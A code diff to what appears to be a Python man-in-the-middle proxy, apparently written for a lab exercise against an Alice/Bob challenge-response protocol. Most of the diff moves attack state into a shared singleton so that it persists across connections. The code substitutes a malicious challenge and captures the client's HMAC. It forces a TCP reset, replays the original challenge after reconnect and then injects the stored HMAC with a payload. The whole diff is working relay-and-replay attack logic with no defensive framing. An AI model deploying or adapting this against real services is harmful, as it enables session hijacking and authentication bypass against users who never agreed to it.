@@ -4,13 +4,29 @@ import socket
 import struct
 import logging
 
-class MitmAttackHandler:
-    def __init__(self, direction_name, payload_handler):
-        self.direction_name = direction_name
-        self.payload_handler = payload_handler
-        self.attack_enabled = payload_handler.is_attack_mode_enabled(direction_name)
-        self.attack_payload_hex = payload_handler.get_attack_payload(direction_name)
-        self.attack_log = payload_handler.should_log_attack(direction_name)
+class MitmGlobalState:
+    """Global state manager for MITM attacks across connections"""
+    _instance = None
+    
+    def __new__(cls):
+        if cls._instance is None:
+            cls._instance = super().__new__(cls)
+            cls._instance.state = {
+                'active': False,
+                'stored_challenge': None,
+                'stored_hmac': None,
+                'injected': False,
+                'phase': None,
+                'original_challenge': None,
+                'original_hmac': None,
+                'replay_ready': False,
+                'connection_count': 0,
+                'message_count': 0
+            }
+        return cls._instance
+    
+    def reset_state(self):
+        """Reset the global state for a new attack cycle"""
         self.state = {
             'active': False,
             'stored_challenge': None,
@@ -23,6 +39,15 @@ class MitmAttackHandler:
             'connection_count': 0,
             'message_count': 0
         }
+
+class MitmAttackHandler:
+    def __init__(self, direction_name, payload_handler):
+        self.direction_name = direction_name
+        self.payload_handler = payload_handler
+        self.attack_enabled = payload_handler.is_attack_mode_enabled(direction_name)
+        self.attack_payload_hex = payload_handler.get_attack_payload(direction_name)
+        self.attack_log = payload_handler.should_log_attack(direction_name)
+        self.global_state = MitmGlobalState()
         if self.attack_enabled and self.attack_log:
             logging.info(f"[MITM] Attack mode enabled for direction {direction_name}")
 
@@ -53,16 +78,16 @@ class MitmAttackHandler:
         if not self.attack_enabled:
             return should_forward
             
-        self.state['message_count'] += 1
+        self.global_state.state['message_count'] += 1
         
         # Enhanced logging for debugging
         if self.attack_log:
-            logging.info(f"[MITM] Message #{self.state['message_count']}:")
+            logging.info(f"[MITM] Message #{self.global_state.state['message_count']}:")
             logging.info(f"  Type: {type(raw_msg)}")
             logging.info(f"  Content: {str(raw_msg)[:200]}")
             logging.info(f"  Raw data hex: {self.hex_dump(original_data)}")
-            logging.info(f"  State: {self.state['phase']}")
-            logging.info(f"  Active: {self.state['active']}")
+            logging.info(f"  State: {self.global_state.state['phase']}")
+            logging.info(f"  Active: {self.global_state.state['active']}")
             
         # Detect challenge from server (Bob) - try multiple formats
         challenge_detected = False
@@ -82,13 +107,13 @@ class MitmAttackHandler:
                 challenge_detected = True
                 
         if challenge_detected:
-            if not self.state['active']:
-                self.state['active'] = True
-                self.state['phase'] = 'waiting_hmac'
-                self.state['original_challenge'] = original_data
-                self.state['connection_count'] += 1
+            if not self.global_state.state['active']:
+                self.global_state.state['active'] = True
+                self.global_state.state['phase'] = 'waiting_hmac'
+                self.global_state.state['original_challenge'] = original_data
+                self.global_state.state['connection_count'] += 1
                 if self.attack_log:
-                    logging.info(f"[MITM] *** CHALLENGE DETECTED on connection #{self.state['connection_count']} ***")
+                    logging.info(f"[MITM] *** CHALLENGE DETECTED on connection #{self.global_state.state['connection_count']} ***")
                     logging.info(f"[MITM] Challenge content: {raw_msg}")
                     logging.info(f"[MITM] Original data length: {len(original_data)} bytes")
                 # Instead of forwarding Bob's challenge, send our own malicious challenge
@@ -116,33 +141,55 @@ class MitmAttackHandler:
                 return False
                 
         # Detect HMAC from client (Alice) - this should be the response to our malicious challenge
-        elif self.state['active'] and self.state['phase'] == 'waiting_hmac' and isinstance(raw_msg, (bytes, str)):
-            self.state['stored_hmac'] = original_data
-            self.state['phase'] = 'waiting_reconnect'
-            if self.attack_log:
-                logging.info(f"[MITM] *** HMAC DETECTED from client ***")
-                logging.info(f"[MITM] HMAC content: {str(raw_msg)[:100]}")
-                logging.info(f"[MITM] HMAC data length: {len(original_data)} bytes")
-                logging.info(f"[MITM] Forcing TCP RST.")
-            # Force TCP RST instead of graceful close
-            self.force_tcp_rst(writer)
-            writer.close()
-            await writer.wait_closed()
-            return False
+        elif self.global_state.state['active'] and self.global_state.state['phase'] == 'waiting_hmac' and isinstance(raw_msg, (bytes, str)):
+            # Check if this looks like an HMAC response (not a challenge or welcome)
+            if isinstance(raw_msg, str) and not raw_msg.startswith('#CHALLENGE#') and not raw_msg.startswith('#WELCOME#'):
+                self.global_state.state['stored_hmac'] = original_data
+                self.global_state.state['phase'] = 'waiting_reconnect'
+                if self.attack_log:
+                    logging.info(f"[MITM] *** HMAC DETECTED from client ***")
+                    logging.info(f"[MITM] HMAC content: {str(raw_msg)[:100]}")
+                    logging.info(f"[MITM] HMAC data length: {len(original_data)} bytes")
+                    logging.info(f"[MITM] Forcing TCP RST.")
+                # Force TCP RST instead of graceful close
+                self.force_tcp_rst(writer)
+                writer.close()
+                await writer.wait_closed()
+                return False
+                
+        # Special handling for alice_to_bob direction to capture HMAC responses
+        elif (self.direction_name == 'alice_to_bob' and 
+              self.global_state.state['active'] and 
+              self.global_state.state['phase'] == 'waiting_hmac' and 
+              isinstance(raw_msg, (bytes, str))):
+            # In alice_to_bob direction, we're looking for Alice's response to our malicious challenge
+            if isinstance(raw_msg, str) and not raw_msg.startswith('#CHALLENGE#') and not raw_msg.startswith('#WELCOME#'):
+                self.global_state.state['stored_hmac'] = original_data
+                self.global_state.state['phase'] = 'waiting_reconnect'
+                if self.attack_log:
+                    logging.info(f"[MITM] *** HMAC CAPTURED in alice_to_bob direction ***")
+                    logging.info(f"[MITM] HMAC content: {str(raw_msg)[:100]}")
+                    logging.info(f"[MITM] HMAC data length: {len(original_data)} bytes")
+                    logging.info(f"[MITM] Forcing TCP RST.")
+                # Force TCP RST instead of graceful close
+                self.force_tcp_rst(writer)
+                writer.close()
+                await writer.wait_closed()
+                return False
             
         # After reconnect, replay original challenge
-        elif self.state['active'] and self.state['phase'] == 'waiting_reconnect' and self.state['original_challenge']:
+        elif self.global_state.state['active'] and self.global_state.state['phase'] == 'waiting_reconnect' and self.global_state.state['original_challenge']:
             if self.attack_log:
                 logging.info(f"[MITM] *** Replaying original challenge after reconnect ***")
-            writer.write(self.state['original_challenge'])
+            writer.write(self.global_state.state['original_challenge'])
             await writer.drain()
-            self.state['phase'] = 'waiting_welcome'
+            self.global_state.state['phase'] = 'waiting_welcome'
             if self.attack_log:
                 logging.info(f"[MITM] Replayed original challenge to client after reconnect.")
             return False
             
         # After handshake, inject malicious payload
-        elif self.state['active'] and self.state['phase'] == 'waiting_welcome':
+        elif self.global_state.state['active'] and self.global_state.state['phase'] == 'waiting_welcome':
             welcome_detected = False
             if isinstance(raw_msg, str) and raw_msg.startswith('#WELCOME#'):
                 welcome_detected = True
@@ -153,18 +200,18 @@ class MitmAttackHandler:
                     welcome_detected = True
                     
             if welcome_detected:
-                if not self.state['injected'] and self.state['stored_hmac']:
+                if not self.global_state.state['injected'] and self.global_state.state['stored_hmac']:
                     if self.attack_log:
                         logging.info(f"[MITM] *** Injecting stored HMAC and malicious payload after handshake ***")
-                    writer.write(self.state['stored_hmac'])
+                    writer.write(self.global_state.state['stored_hmac'])
                     await writer.drain()
                     if self.attack_log:
                         logging.info(f"[MITM] Injected stored HMAC and malicious payload after handshake.")
-                    self.state['injected'] = True
+                    self.global_state.state['injected'] = True
                 return True
             
         # If we're in attack mode but haven't seen a challenge yet, just forward normally
-        elif self.state['active'] and self.state['phase'] is None:
+        elif self.global_state.state['active'] and self.global_state.state['phase'] is None:
             if self.attack_log:
                 logging.info(f"[MITM] Waiting for challenge, forwarding message normally.")
             return True
